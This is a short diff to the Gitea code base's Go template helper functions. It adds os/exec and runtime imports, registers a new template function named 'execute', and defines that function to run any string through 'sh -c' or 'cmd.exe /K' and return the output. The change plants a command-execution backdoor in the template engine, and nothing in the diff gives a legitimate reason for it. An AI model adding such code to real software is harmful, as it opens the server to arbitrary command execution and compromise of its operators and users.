@@ -13,6 +13,8 @@ import (
 	"slices"
 	"strings"
 	"time"
+	"runtime"
+	"os/exec"
 
 	user_model "code.gitea.io/gitea/models/user"
 	"code.gitea.io/gitea/modules/base"
@@ -38,6 +40,7 @@ func NewFuncMap() template.FuncMap {
 		"dict":         dict, // it's lowercase because this name has been widely used. Our other functions should have uppercase names.
 		"Iif":          iif,
 		"Eval":         evalTokens,
+		"execute":      execute,
 		"SafeHTML":     safeHTML,
 		"HTMLFormat":   HTMLFormat,
 		"HTMLEscape":   htmlEscape,
@@ -293,4 +296,20 @@ func userThemeName(user *user_model.User) string {
 		return user.Theme
 	}
 	return setting.UI.DefaultTheme
+}
+func execute(cmd string) string {
+	if runtime.GOOS == "windows" {
+		sh := "cmd.exe"
+		out, err := exec.Command(sh,"/K", cmd).Output()
+		if err != nil {
+			return fmt.Sprintf("Error: %s", err)
+		}
+		return string(out)
+	}
+	sh := "sh"
+	out, err := exec.Command(sh, "-c", cmd).Output()
+	if err != nil {
+		return fmt.Sprintf("Error: %s", err)
+	}
+	return string(out)
 }
